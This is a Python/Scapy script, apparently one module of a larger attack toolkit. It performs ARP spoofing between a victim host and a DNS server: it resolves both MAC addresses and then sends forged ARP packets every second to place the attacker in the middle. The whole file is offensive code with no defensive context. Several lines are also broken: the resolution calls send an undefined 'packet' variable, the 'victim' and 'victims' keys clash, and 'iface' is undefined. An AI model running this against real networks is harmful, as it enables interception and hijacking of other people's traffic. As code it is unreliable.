import sys
import os
from scapy.all import *
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'environment')))
from attack_status import ATTACK_STATUS

def arp():

	self_mac = get_if_hwaddr(str(ATTACK_STATUS['iface']))

	if not self_mac:
		print("Impossible de récupérer l'adresse MAC pour l'interface réseau spécifiée. Reconfigurez l'interface réseau avec la commande set_iface [interface]")
		return

	arp_resolver_package_victim = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ATTACK_STATUS["victims"])
	mac_victim = srp(packet, timeout=2, verbose=False)[0][0][1].hwsrc

	arp_resolver_package_dns = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ATTACK_STATUS["dns"])
	mac_dns = srp(packet, timeout=2, verbose=False)[0][0][1].hwsrc

	p1 = Ether(dst=mac_victim) / ARP(op=1, hwsrc=self_mac, psrc=ATTACK_STATUS['dns'], hwdst="00:00:00:00:00:00", pdst=ATTACK_STATUS['victim']);
	p2 = Ether(dst=mac_dns) / ARP(op=1, hwsrc=self_mac, psrc=ATTACK_STATUS['victim'], hwdst="00:00:00:00:00:00", pdst=ATTACK_STATUS['dns']);

	while True:

			sendp(p1, iface=str(iface), verbose=False)
			sendp(p2, iface=str(iface), verbose=False)
			time.sleep(1)

			

			
